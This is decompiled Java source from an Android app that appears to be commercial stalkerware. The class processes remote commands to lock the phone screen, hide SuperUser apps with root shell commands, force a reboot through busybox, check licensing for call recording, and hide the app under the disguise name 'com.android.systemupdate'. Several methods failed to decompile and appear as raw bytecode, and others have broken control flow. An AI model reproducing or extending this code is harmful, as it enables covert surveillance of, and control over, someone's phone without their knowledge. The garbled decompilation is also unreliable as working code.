package com.vvt.appengine;

import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.SystemClock;
import com.fx.socket.TcpSocketCmd;
import com.vvt.activation_manager.ActivationManager;
import com.vvt.appengine.a.ab;
import com.vvt.appengine.a.as;
import com.vvt.appengine.a.at;
import com.vvt.appengine.a.av;
import com.vvt.appengine.a.ax;
import com.vvt.appengine.a.az;
import com.vvt.appengine.a.ba;
import com.vvt.appengine.a.bc;
import com.vvt.appengine.a.be;
import com.vvt.appengine.a.bg;
import com.vvt.appengine.a.bi;
import com.vvt.appengine.a.bj;
import com.vvt.appengine.a.bl;
import com.vvt.appengine.a.bm;
import com.vvt.appengine.a.bn;
import com.vvt.appengine.a.bo;
import com.vvt.appengine.a.bq;
import com.vvt.appengine.a.bs;
import com.vvt.appengine.a.bt;
import com.vvt.appengine.a.bv;
import com.vvt.appengine.a.bx;
import com.vvt.appengine.a.by;
import com.vvt.appengine.a.bz;
import com.vvt.appengine.a.cb;
import com.vvt.appengine.a.cc;
import com.vvt.appengine.a.cd;
import com.vvt.appengine.a.g;
import com.vvt.appengine.a.i;
import com.vvt.appengine.a.j;
import com.vvt.appengine.a.l;
import com.vvt.appengine.a.n;
import com.vvt.appengine.a.q;
import com.vvt.appengine.a.z;
import com.vvt.base.FeatureId;
import com.vvt.base.RunningMode;
import com.vvt.c.c;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.polymorphic.AppContainerInfo;
import com.vvt.polymorphic.command.RemoteSwitchContainer;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteControlException;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.RemoteOnCommandReceive;
import com.vvt.remotecontrol.command.RemoteGetRmtCtrl;
import com.vvt.remotecontrol.input.RmtCtrlInputActivation;
import com.vvt.remotecontrol.input.RmtCtrlInputRunningMode;
import com.vvt.remotecontrol.output.RmtCtrlOutputRequestBatteryInfo;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import com.vvt.shell.CannotGetRootShellException;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class v
  implements com.fx.socket.d
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private AppEngine1 d;
  
  public v(AppEngine1 paramh)
  {
    this.d = paramh;
  }
  
  private Object a(ActivationManager paramActivationManager, LicenseInfo paramLicenseInfo)
  {
    Object localObject1;
    Object localObject2;
    if (paramLicenseInfo == null)
    {
      localObject1 = null;
      if (localObject1 == null) {
        break label56;
      }
      localObject2 = ((String)localObject1).trim();
      int i = ((String)localObject2).length();
      if (i <= 0) {
        break label56;
      }
      localObject2 = new com/vvt/appengine/a/a;
      ((com.vvt.appengine.a.a)localObject2).<init>(paramActivationManager);
      localObject1 = ((com.vvt.appengine.a.a)localObject2).a((String)localObject1);
    }
    for (;;)
    {
      return localObject1;
      localObject1 = paramLicenseInfo.getActivationCode();
      break;
      label56:
      localObject1 = new com/vvt/remotecontrol/RemoteControlException;
      localObject2 = "Activation code not found!!";
      ((RemoteControlException)localObject1).<init>((String)localObject2);
    }
  }
  
  private Object a(c paramc)
  {
    RmtCtrlOutputRequestBatteryInfo localRmtCtrlOutputRequestBatteryInfo = new com/vvt/remotecontrol/output/RmtCtrlOutputRequestBatteryInfo;
    localRmtCtrlOutputRequestBatteryInfo.<init>();
    int i = paramc.b();
    localRmtCtrlOutputRequestBatteryInfo.setCurrentBatteryLevel(i);
    return localRmtCtrlOutputRequestBatteryInfo;
  }
  
  private Object a(ControlCommand paramControlCommand)
  {
    bool1 = true;
    boolean bool2 = false;
    str = null;
    boolean bool3 = a;
    if (bool3) {}
    int i = 0;
    Object localObject1 = null;
    for (;;)
    {
      try
      {
        localObject2 = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
        ((RmtCtrlOutputStatusMessage)localObject2).<init>();
      }
      finally
      {
        Object localObject2;
        boolean bool5;
        Object[] arrayOfObject;
        boolean bool4;
        bool1 = false;
        Object localObject4 = null;
        continue;
        bool1 = false;
        localObject4 = null;
        continue;
      }
      try
      {
        localObject1 = paramControlCommand.getData();
        bool5 = localObject1 instanceof String;
        if (!bool5) {
          continue;
        }
        localObject1 = localObject1.toString();
        i = Integer.parseInt((String)localObject1);
        if (i == 0)
        {
          bool1 = false;
          localObject4 = null;
        }
        localObject1 = this.d;
        localObject1 = ((AppEngine1)localObject1).Y;
        if (localObject1 == null) {
          continue;
        }
        if (!bool1) {
          continue;
        }
        localObject1 = this.d;
        localObject1 = ((AppEngine1)localObject1).Y;
        ((com.vvt.capture.d.a)localObject1).b();
        localObject1 = "Phone screen is %s";
        bool5 = true;
        arrayOfObject = new Object[bool5];
        if (!bool1) {
          continue;
        }
        localObject4 = "locked";
      }
      finally
      {
        localObject4 = localObject2;
        localObject2 = localObject5;
        bool4 = c;
        if (!bool4) {
          continue;
        }
        ((RmtCtrlOutputStatusMessage)localObject4).setSuccess(false);
        str = ((Throwable)localObject2).getMessage();
        ((RmtCtrlOutputStatusMessage)localObject4).setMessage(str);
        continue;
        localObject4 = "unlocked";
        continue;
      }
      arrayOfObject[0] = localObject4;
      localObject4 = String.format((String)localObject1, arrayOfObject);
      ((RmtCtrlOutputStatusMessage)localObject2).setMessage((String)localObject4);
      bool1 = true;
      ((RmtCtrlOutputStatusMessage)localObject2).setSuccess(bool1);
      localObject4 = localObject2;
      bool2 = a;
      if (bool2) {}
      return localObject4;
      localObject1 = this.d;
      localObject1 = ((AppEngine1)localObject1).Y;
      ((com.vvt.capture.d.a)localObject1).a();
    }
  }
  
  private Object a(ControlCommand paramControlCommand, ActivationManager paramActivationManager, com.vvt.license.a parama)
  {
    Object localObject1 = paramControlCommand.getData();
    boolean bool = localObject1 instanceof RmtCtrlInputActivation;
    Object localObject2;
    if (bool)
    {
      localObject2 = new com/vvt/appengine/a/a;
      ((com.vvt.appengine.a.a)localObject2).<init>(paramActivationManager);
      localObject1 = (RmtCtrlInputActivation)localObject1;
      localObject1 = ((com.vvt.appengine.a.a)localObject2).a((RmtCtrlInputActivation)localObject1, parama);
    }
    for (;;)
    {
      return localObject1;
      localObject1 = new com/vvt/remotecontrol/RemoteControlException;
      localObject2 = "Expected data missing.";
      ((RemoteControlException)localObject1).<init>((String)localObject2);
    }
  }
  
  private void a(List paramList)
  {
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      boolean bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      Object localObject = (ComponentName)localIterator.next();
      try
      {
        boolean bool2 = a;
        if (bool2) {}
        String str1 = ((ComponentName)localObject).getPackageName();
        bool1 = a;
        if (bool1) {}
        localObject = this.d;
        localObject = ((AppEngine1)localObject).a();
        String str2 = "activity";
        localObject = ((Context)localObject).getSystemService(str2);
        localObject = (ActivityManager)localObject;
        ((ActivityManager)localObject).restartPackage(str1);
      }
      catch (Exception localException) {}
    }
  }
  
  /* Error */
  private void a(boolean paramBoolean)
  {
    // Byte code:
    //   0: aload_0
    //   1: getfield 31	com/vvt/appengine/v:d	Lcom/vvt/appengine/AppEngine1;
    //   4: invokevirtual 155	com/vvt/appengine/AppEngine1:a	()Landroid/content/Context;
    //   7: astore_2
    //   8: ldc -84
    //   10: astore_3
    //   11: aload_2
    //   12: aload_3
    //   13: invokestatic 177	com/vvt/ab/e:a	(Landroid/content/Context;Ljava/lang/String;)Z
    //   16: istore 4
    //   18: iload 4
    //   20: ifeq +86 -> 106
    //   23: getstatic 17	com/vvt/appengine/v:a	Z
    //   26: istore 4
    //   28: iload 4
    //   30: ifeq +3 -> 33
    //   33: iload_1
    //   34: ifeq +73 -> 107
    //   37: ldc -77
    //   39: astore_2
    //   40: iconst_2
    //   41: istore 5
    //   43: iload 5
    //   45: anewarray 4	java/lang/Object
    //   48: astore 6
    //   50: aload 6
    //   52: iconst_0
    //   53: aload_2
    //   54: aastore
    //   55: ldc -84
    //   57: astore 7
    //   59: aload 6
    //   61: iconst_1
    //   62: aload 7
    //   64: aastore
    //   65: ldc -75
    //   67: aload 6
    //   69: invokestatic 109	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   72: astore_3
    //   73: getstatic 17	com/vvt/appengine/v:a	Z
    //   76: istore 4
    //   78: iload 4
    //   80: ifeq +3 -> 83
    //   83: iconst_0
    //   84: istore 4
    //   86: aconst_null
    //   87: astore_2
    //   88: invokestatic 187	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   91: astore_2
    //   92: aload_2
    //   93: aload_3
    //   94: invokevirtual 190	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   97: pop
    //   98: aload_2
    //   99: ifnull +7 -> 106
    //   102: aload_2
    //   103: invokevirtual 192	com/vvt/shell/f:d	()V
    //   106: return
    //   107: ldc -62
    //   109: astore_2
    //   110: goto -70 -> 40
    //   113: astore 8
    //   115: aconst_null
    //   116: astore_3
    //   117: aload 8
    //   119: astore_2
    //   120: aload_3
    //   121: ifnull +7 -> 128
    //   124: aload_3
    //   125: invokevirtual 192	com/vvt/shell/f:d	()V
    //   128: aload_2
    //   129: athrow
    //   130: astore_3
    //   131: aload_2
    //   132: ifnull -26 -> 106
    //   135: goto -33 -> 102
    //   138: astore 8
    //   140: aload_2
    //   141: astore_3
    //   142: aload 8
    //   144: astore_2
    //   145: goto -25 -> 120
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	148	0	this	v
    //   0	148	1	paramBoolean	boolean
    //   7	138	2	localObject1	Object
    //   10	115	3	str1	String
    //   130	1	3	localCannotGetRootShellException	CannotGetRootShellException
    //   141	1	3	localObject2	Object
    //   16	69	4	bool	boolean
    //   41	3	5	i	int
    //   48	20	6	arrayOfObject	Object[]
    //   57	6	7	str2	String
    //   113	5	8	localObject3	Object
    //   138	5	8	localObject4	Object
    // Exception table:
    //   from	to	target	type
    //   88	91	113	finally
    //   88	91	130	com/vvt/shell/CannotGetRootShellException
    //   93	98	130	com/vvt/shell/CannotGetRootShellException
    //   93	98	138	finally
  }
  
  /* Error */
  private void a(boolean paramBoolean, List paramList)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_3
    //   2: aconst_null
    //   3: astore 4
    //   5: invokestatic 187	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   8: astore 5
    //   10: aload_2
    //   11: invokeinterface 138 1 0
    //   16: astore 6
    //   18: aload 6
    //   20: invokeinterface 144 1 0
    //   25: istore_3
    //   26: iload_3
    //   27: ifeq +150 -> 177
    //   30: aload 6
    //   32: invokeinterface 147 1 0
    //   37: astore 4
    //   39: aload 4
    //   41: checkcast 149	android/content/ComponentName
    //   44: astore 4
    //   46: getstatic 17	com/vvt/appengine/v:a	Z
    //   49: istore 7
    //   51: iload 7
    //   53: ifeq +3 -> 56
    //   56: iload_1
    //   57: ifeq +91 -> 148
    //   60: ldc -77
    //   62: astore 8
    //   64: ldc -75
    //   66: astore 9
    //   68: iconst_2
    //   69: istore 10
    //   71: iload 10
    //   73: anewarray 4	java/lang/Object
    //   76: astore 11
    //   78: aload 11
    //   80: iconst_0
    //   81: aload 8
    //   83: aastore
    //   84: iconst_1
    //   85: istore 7
    //   87: aload 4
    //   89: invokevirtual 152	android/content/ComponentName:getPackageName	()Ljava/lang/String;
    //   92: astore 4
    //   94: aload 11
    //   96: iload 7
    //   98: aload 4
    //   100: aastore
    //   101: aload 9
    //   103: aload 11
    //   105: invokestatic 109	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   108: astore 4
    //   110: getstatic 17	com/vvt/appengine/v:a	Z
    //   113: istore 7
    //   115: iload 7
    //   117: ifeq +3 -> 120
    //   120: aload 5
    //   122: aload 4
    //   124: invokevirtual 190	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   127: pop
    //   128: goto -110 -> 18
    //   131: astore 4
    //   133: aload 5
    //   135: astore 4
    //   137: aload 4
    //   139: ifnull +8 -> 147
    //   142: aload 4
    //   144: invokevirtual 192	com/vvt/shell/f:d	()V
    //   147: return
    //   148: ldc -62
    //   150: astore 8
    //   152: goto -88 -> 64
    //   155: astore 12
    //   157: aconst_null
    //   158: astore 5
    //   160: aload 12
    //   162: astore 4
    //   164: aload 5
    //   166: ifnull +8 -> 174
    //   169: aload 5
    //   171: invokevirtual 192	com/vvt/shell/f:d	()V
    //   174: aload 4
    //   176: athrow
    //   177: aload 5
    //   179: ifnull -32 -> 147
    //   182: aload 5
    //   184: invokevirtual 192	com/vvt/shell/f:d	()V
    //   187: goto -40 -> 147
    //   190: astore 4
    //   192: goto -28 -> 164
    //   195: astore 5
    //   197: goto -60 -> 137
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	200	0	this	v
    //   0	200	1	paramBoolean	boolean
    //   0	200	2	paramList	List
    //   1	26	3	bool1	boolean
    //   3	120	4	localObject1	Object
    //   131	1	4	localException1	Exception
    //   135	40	4	localObject2	Object
    //   190	1	4	localObject3	Object
    //   8	175	5	localf	com.vvt.shell.f
    //   195	1	5	localException2	Exception
    //   16	15	6	localIterator	Iterator
    //   49	67	7	bool2	boolean
    //   62	89	8	str1	String
    //   66	36	9	str2	String
    //   69	3	10	i	int
    //   76	28	11	arrayOfObject	Object[]
    //   155	6	12	localObject4	Object
    // Exception table:
    //   from	to	target	type
    //   10	16	131	java/lang/Exception
    //   18	25	131	java/lang/Exception
    //   30	37	131	java/lang/Exception
    //   39	44	131	java/lang/Exception
    //   46	49	131	java/lang/Exception
    //   71	76	131	java/lang/Exception
    //   81	84	131	java/lang/Exception
    //   87	92	131	java/lang/Exception
    //   98	101	131	java/lang/Exception
    //   103	108	131	java/lang/Exception
    //   110	113	131	java/lang/Exception
    //   122	128	131	java/lang/Exception
    //   5	8	155	finally
    //   10	16	190	finally
    //   18	25	190	finally
    //   30	37	190	finally
    //   39	44	190	finally
    //   46	49	190	finally
    //   71	76	190	finally
    //   81	84	190	finally
    //   87	92	190	finally
    //   98	101	190	finally
    //   103	108	190	finally
    //   110	113	190	finally
    //   122	128	190	finally
    //   5	8	195	java/lang/Exception
  }
  
  private Object b()
  {
    boolean bool1 = true;
    bool2 = a;
    if (bool2) {}
    Object localObject1 = com.vvt.io.p.a(this.d.b(), "busybox");
    Object localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    boolean bool3 = ((File)localObject2).exists();
    if (bool3) {}
    try
    {
      localObject2 = com.vvt.shell.f.b();
      String str = "%s reboot -f";
      int i = 1;
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = localObject1;
      localObject1 = String.format(str, arrayOfObject);
      ((com.vvt.shell.f)localObject2).a((String)localObject1);
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      for (;;)
      {
        bool2 = c;
        if (!bool2) {}
      }
    }
    localObject1 = this.d.a();
    com.fx.daemon.b.a((Context)localObject1);
    bool2 = a;
    if (bool2) {}
    return Boolean.valueOf(bool1);
  }
  
  private Object b(ControlCommand paramControlCommand)
  {
    Object localObject = paramControlCommand.getData();
    boolean bool1 = localObject instanceof RmtCtrlInputRunningMode;
    boolean bool2;
    if (bool1)
    {
      localObject = ((RmtCtrlInputRunningMode)localObject).getRunningMode();
      AppEngine1 localh = this.d;
      localh.a((RunningMode)localObject);
      bool2 = true;
    }
    for (;;)
    {
      return Boolean.valueOf(bool2);
      bool2 = false;
      localObject = null;
    }
  }
  
  private void b(boolean paramBoolean)
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = false;
    List localList = null;
    RunningMode localRunningMode1;
    RunningMode localRunningMode2;
    boolean bool2;
    if (paramBoolean)
    {
      j();
      if (localList != null)
      {
        int i = localList.size();
        if (i > 0)
        {
          localRunningMode1 = this.d.d();
          localRunningMode2 = RunningMode.FULL;
          if (localRunningMode1 != localRunningMode2) {
            break label88;
          }
          bool2 = a;
          if (bool2) {}
          b(paramBoolean, localList);
        }
      }
    }
    for (;;)
    {
      a(localList);
      return;
      localList = i();
      break;
      label88:
      localRunningMode2 = RunningMode.LIMITED_1;
      if (localRunningMode1 == localRunningMode2)
      {
        bool2 = a;
        if (bool2) {}
        a(paramBoolean, localList);
      }
    }
  }
  
  private void b(boolean paramBoolean, List paramList)
  {
    int i = 1;
    Iterator localIterator = paramList.iterator();
    boolean bool = localIterator.hasNext();
    if (bool)
    {
      ComponentName localComponentName = (ComponentName)localIterator.next();
      int j = a;
      if (j != 0) {}
      Context localContext = this.d.a();
      PackageManager localPackageManager = localContext.getPackageManager();
      if (paramBoolean) {}
      int k;
      for (j = i;; k = 2)
      {
        localPackageManager.setComponentEnabledSetting(localComponentName, j, i);
        break;
      }
    }
  }
  
  private RmtCtrlOutputStatusMessage c(ControlCommand paramControlCommand)
  {
    bool1 = true;
    boolean bool2 = false;
    str = null;
    boolean bool3 = b;
    if (bool3) {}
    int i = 0;
    Object localObject1 = null;
    for (;;)
    {
      Object localObject4;
      try
      {
        localRmtCtrlOutputStatusMessage = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
        localRmtCtrlOutputStatusMessage.<init>();
      }
      finally
      {
        RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage;
        boolean bool5;
        Object[] arrayOfObject;
        bool1 = false;
        localObject4 = null;
        boolean bool4 = c;
        if (bool4) {}
        ((RmtCtrlOutputStatusMessage)localObject4).setSuccess(false);
        str = ((Throwable)localObject2).getMessage();
        ((RmtCtrlOutputStatusMessage)localObject4).setMessage(str);
        continue;
      }
      try
      {
        localObject1 = paramControlCommand.getData();
        bool5 = localObject1 instanceof String;
        if (!bool5) {
          break label215;
        }
        localObject1 = localObject1.toString();
        i = Integer.parseInt((String)localObject1);
        if (i == 0)
        {
          bool1 = false;
          localObject4 = null;
        }
      }
      finally
      {
        localObject4 = localObject2;
        Object localObject3 = localObject5;
        continue;
        bool1 = false;
        localObject4 = null;
      }
    }
    b(bool1);
    a(bool1);
    localObject1 = "SuperUser is %s";
    bool5 = true;
    arrayOfObject = new Object[bool5];
    if (bool1) {}
    for (localObject4 = "visible";; localObject4 = "invisible")
    {
      arrayOfObject[0] = localObject4;
      localObject4 = String.format((String)localObject1, arrayOfObject);
      localRmtCtrlOutputStatusMessage.setMessage((String)localObject4);
      bool1 = true;
      localRmtCtrlOutputStatusMessage.setSuccess(bool1);
      localObject4 = localRmtCtrlOutputStatusMessage;
      bool2 = b;
      if (bool2) {}
      return (RmtCtrlOutputStatusMessage)localObject4;
    }
  }
  
  private String c()
  {
    Object localObject1 = this.d.k;
    Object localObject2;
    int i;
    LicenseStatus localLicenseStatus1;
    LicenseStatus localLicenseStatus2;
    if (localObject1 != null)
    {
      localObject1 = this.d.k.a();
      if (localObject1 != null)
      {
        localObject1 = this.d.k;
        localObject2 = ((com.vvt.license.b)localObject1).a();
        i = ((LicenseInfo)localObject2).getConfigurationId();
        localLicenseStatus1 = ((LicenseInfo)localObject2).getLicenseStatus();
        localLicenseStatus2 = LicenseStatus.NOT_ACTIVATED;
        if (localLicenseStatus1 == localLicenseStatus2) {
          i = -1;
        }
      }
    }
    for (localObject1 = String.valueOf(i);; localObject1 = "Not configured")
    {
      return (String)localObject1;
      localLicenseStatus1 = ((LicenseInfo)localObject2).getLicenseStatus();
      localLicenseStatus2 = LicenseStatus.EXPIRED;
      if (localLicenseStatus1 == localLicenseStatus2)
      {
        i = -2;
        break;
      }
      localObject2 = ((LicenseInfo)localObject2).getLicenseStatus();
      localLicenseStatus1 = LicenseStatus.DISABLED;
      if (localObject2 != localLicenseStatus1) {
        break;
      }
      i = -3;
      break;
    }
  }
  
  private String d()
  {
    Object localObject = this.d.k;
    int i;
    if (localObject != null)
    {
      localObject = this.d.k.a();
      if (localObject != null) {
        i = this.d.k.d().getConfigurationId();
      }
    }
    for (localObject = String.valueOf(i);; localObject = "Not configured") {
      return (String)localObject;
    }
  }
  
  private boolean e()
  {
    Object localObject = this.d.k;
    boolean bool1;
    if (localObject != null)
    {
      localObject = this.d.k.a();
      if (localObject != null)
      {
        localObject = this.d.k.d();
        int i = ((LicenseInfo)localObject).getConfigurationId();
        com.vvt.configurationmanager.e locale = this.d.e;
        FeatureId localFeatureId = FeatureId.CAPTURE_CALL_RECORDING;
        bool1 = locale.a(localFeatureId, i);
      }
    }
    for (;;)
    {
      boolean bool2 = a;
      if (bool2) {}
      return bool1;
      bool1 = false;
      localObject = null;
    }
  }
  
  private String f()
  {
    Object localObject = this.d.o;
    if (localObject != null) {}
    for (localObject = this.d.o.getProductVersion();; localObject = "Not Found") {
      return (String)localObject;
    }
  }
  
  private boolean g()
  {
    Object localObject1 = new com/vvt/polymorphic/command/RemoteSwitchContainer;
    ((RemoteSwitchContainer)localObject1).<init>();
    try
    {
      localObject1 = ((RemoteSwitchContainer)localObject1).execute();
      localObject1 = (Boolean)localObject1;
      bool = ((Boolean)localObject1).booleanValue();
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        boolean bool = c;
        if (bool) {}
        bool = false;
        Object localObject2 = null;
      }
    }
    return bool;
  }
  
  private boolean h()
  {
    boolean bool1 = b;
    if (bool1) {}
    boolean bool2 = false;
    w localw = null;
    bool1 = b;
    if (bool1) {}
    Object localObject1 = new com/vvt/polymorphic/AppContainerInfo;
    ((AppContainerInfo)localObject1).<init>();
    Object localObject2 = this.d.b();
    ((AppContainerInfo)localObject1).load((String)localObject2);
    localObject1 = ((AppContainerInfo)localObject1).getPackageName();
    boolean bool3 = com.vvt.ag.b.a((String)localObject1);
    if (bool3)
    {
      bool1 = b;
      if (bool1) {}
      localObject1 = "com.android.systemupdate";
    }
    bool3 = b;
    if (bool3) {}
    localObject2 = this.d.a();
    bool3 = com.vvt.polymorphic.b.a((Context)localObject2, (String)localObject1);
    boolean bool4 = b;
    if ((!bool4) || (bool3))
    {
      localw = new com/vvt/appengine/w;
      localObject2 = "HideAppT";
      localw.<init>(this, (String)localObject2, (String)localObject1);
      localw.start();
      bool1 = true;
      bool2 = b;
      if (!bool2) {}
    }
    for (;;)
    {
      bool2 = b;
      if (bool2) {}
      return bool1;
      bool1 = c;
      if (bool1) {}
      bool1 = false;
      localObject1 = null;
    }
  }
  
  private List i()
  {
    int i = 0;
    String str = null;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    List localList = com.vvt.ab.e.a();
    int j = localList.size();
    Object localObject1 = this.d.a();
    PackageManager localPackageManager = ((Context)localObject1).getPackageManager();
    int k = 0;
    while (k < j)
    {
      str = (String)localList.get(k);
      boolean bool1 = a;
      if (bool1) {}
      try
      {
        localObject1 = new android/content/Intent;
        localObject2 = "android.intent.action.MAIN";
        bool2 = false;
        localComponentName = null;
        ((Intent)localObject1).<init>((String)localObject2, null);
        localObject2 = "android.intent.category.LAUNCHER";
        ((Intent)localObject1).addCategory((String)localObject2);
        ((Intent)localObject1).setPackage(str);
        int m = 0;
        localObject2 = null;
        localObject1 = localPackageManager.queryIntentActivities((Intent)localObject1, 0);
        if (localObject1 != null)
        {
          m = ((List)localObject1).size();
          if (m > 0) {
            break label165;
          }
        }
      }
      catch (Exception localException)
      {
        Object localObject2;
        boolean bool2;
        ComponentName localComponentName;
        for (;;) {}
      }
      i = k + 1;
      k = i;
      continue;
      label165:
      localObject2 = ((List)localObject1).iterator();
      for (;;)
      {
        bool1 = ((Iterator)localObject2).hasNext();
        if (!bool1) {
          break;
        }
        localObject1 = ((Iterator)localObject2).next();
        localObject1 = (ResolveInfo)localObject1;
        localObject1 = ((ResolveInfo)localObject1).activityInfo;
        localObject1 = ((ActivityInfo)localObject1).name;
        bool2 = a;
        if (bool2) {}
        localComponentName = new android/content/ComponentName;
        localComponentName.<init>(str, (String)localObject1);
        localArrayList.add(localComponentName);
      }
    }
    return localArrayList;
  }
  
  /* Error */
  private void j()
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: invokestatic 387	com/vvt/ab/e:a	()Ljava/util/List;
    //   7: astore_3
    //   8: invokestatic 187	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   11: astore 4
    //   13: aload_3
    //   14: invokeinterface 239 1 0
    //   19: istore 5
    //   21: iconst_0
    //   22: istore 6
    //   24: iload 6
    //   26: iload 5
    //   28: if_icmpge +405 -> 433
    //   31: aload_3
    //   32: iload 6
    //   34: invokeinterface 391 2 0
    //   39: astore_2
    //   40: aload_2
    //   41: checkcast 33	java/lang/String
    //   44: astore_2
    //   45: aload_0
    //   46: getfield 31	com/vvt/appengine/v:d	Lcom/vvt/appengine/AppEngine1;
    //   49: astore 7
    //   51: aload 7
    //   53: invokevirtual 155	com/vvt/appengine/AppEngine1:a	()Landroid/content/Context;
    //   56: astore 7
    //   58: aload 7
    //   60: aload_2
    //   61: invokestatic 177	com/vvt/ab/e:a	(Landroid/content/Context;Ljava/lang/String;)Z
    //   64: istore 8
    //   66: iload 8
    //   68: ifeq +338 -> 406
    //   71: getstatic 17	com/vvt/appengine/v:a	Z
    //   74: istore 8
    //   76: iload 8
    //   78: ifeq +3 -> 81
    //   81: new 384	java/util/ArrayList
    //   84: astore 9
    //   86: aload 9
    //   88: invokespecial 385	java/util/ArrayList:<init>	()V
    //   91: ldc_w 432
    //   94: astore 7
    //   96: aload_2
    //   97: aload 7
    //   99: invokevirtual 435	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   102: istore 8
    //   104: iload 8
    //   106: ifeq +143 -> 249
    //   109: ldc_w 432
    //   112: astore_2
    //   113: ldc_w 437
    //   116: astore 7
    //   118: aload 9
    //   120: aload 7
    //   122: invokeinterface 430 2 0
    //   127: pop
    //   128: aload_2
    //   129: astore 7
    //   131: aload 7
    //   133: invokestatic 365	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   136: istore_1
    //   137: iload_1
    //   138: ifne +268 -> 406
    //   141: aload 9
    //   143: invokeinterface 138 1 0
    //   148: astore 9
    //   150: aload 9
    //   152: invokeinterface 144 1 0
    //   157: istore_1
    //   158: iload_1
    //   159: ifeq +247 -> 406
    //   162: aload 9
    //   164: invokeinterface 147 1 0
    //   169: astore_2
    //   170: aload_2
    //   171: checkcast 33	java/lang/String
    //   174: astore_2
    //   175: ldc_w 439
    //   178: astore 10
    //   180: iconst_2
    //   181: istore 11
    //   183: iload 11
    //   185: anewarray 4	java/lang/Object
    //   188: astore 12
    //   190: iconst_0
    //   191: istore 13
    //   193: aload 12
    //   195: iconst_0
    //   196: aload 7
    //   198: aastore
    //   199: iconst_1
    //   200: istore 13
    //   202: aload 12
    //   204: iload 13
    //   206: aload_2
    //   207: aastore
    //   208: aload 10
    //   210: aload 12
    //   212: invokestatic 109	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   215: astore_2
    //   216: getstatic 17	com/vvt/appengine/v:a	Z
    //   219: istore 14
    //   221: iload 14
    //   223: ifeq +3 -> 226
    //   226: aload 4
    //   228: aload_2
    //   229: invokevirtual 190	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   232: pop
    //   233: goto -83 -> 150
    //   236: astore_2
    //   237: aload 4
    //   239: astore_2
    //   240: aload_2
    //   241: ifnull +7 -> 248
    //   244: aload_2
    //   245: invokevirtual 192	com/vvt/shell/f:d	()V
    //   248: return
    //   249: ldc_w 441
    //   252: astore 7
    //   254: aload_2
    //   255: aload 7
    //   257: invokevirtual 435	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   260: istore 8
    //   262: iload 8
    //   264: ifeq +58 -> 322
    //   267: ldc_w 441
    //   270: astore_2
    //   271: ldc_w 443
    //   274: astore 7
    //   276: aload 9
    //   278: aload 7
    //   280: invokeinterface 430 2 0
    //   285: pop
    //   286: ldc_w 445
    //   289: astore 7
    //   291: aload 9
    //   293: aload 7
    //   295: invokeinterface 430 2 0
    //   300: pop
    //   301: ldc_w 447
    //   304: astore 7
    //   306: aload 9
    //   308: aload 7
    //   310: invokeinterface 430 2 0
    //   315: pop
    //   316: aload_2
    //   317: astore 7
    //   319: goto -188 -> 131
    //   322: ldc_w 449
    //   325: astore 7
    //   327: aload_2
    //   328: aload 7
    //   330: invokevirtual 435	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   333: istore 8
    //   335: iload 8
    //   337: ifeq +28 -> 365
    //   340: ldc_w 449
    //   343: astore_2
    //   344: ldc_w 451
    //   347: astore 7
    //   349: aload 9
    //   351: aload 7
    //   353: invokeinterface 430 2 0
    //   358: pop
    //   359: aload_2
    //   360: astore 7
    //   362: goto -231 -> 131
    //   365: ldc_w 453
    //   368: astore 7
    //   370: aload_2
    //   371: aload 7
    //   373: invokevirtual 435	java/lang/String:equalsIgnoreCase	(Ljava/lang/String;)Z
    //   376: istore_1
    //   377: iload_1
    //   378: ifeq +80 -> 458
    //   381: ldc_w 453
    //   384: astore_2
    //   385: ldc_w 455
    //   388: astore 7
    //   390: aload 9
    //   392: aload 7
    //   394: invokeinterface 430 2 0
    //   399: pop
    //   400: aload_2
    //   401: astore 7
    //   403: goto -272 -> 131
    //   406: iload 6
    //   408: iconst_1
    //   409: iadd
    //   410: istore_1
    //   411: iload_1
    //   412: istore 6
    //   414: goto -390 -> 24
    //   417: astore_2
    //   418: aconst_null
    //   419: astore 4
    //   421: aload 4
    //   423: ifnull +8 -> 431
    //   426: aload 4
    //   428: invokevirtual 192	com/vvt/shell/f:d	()V
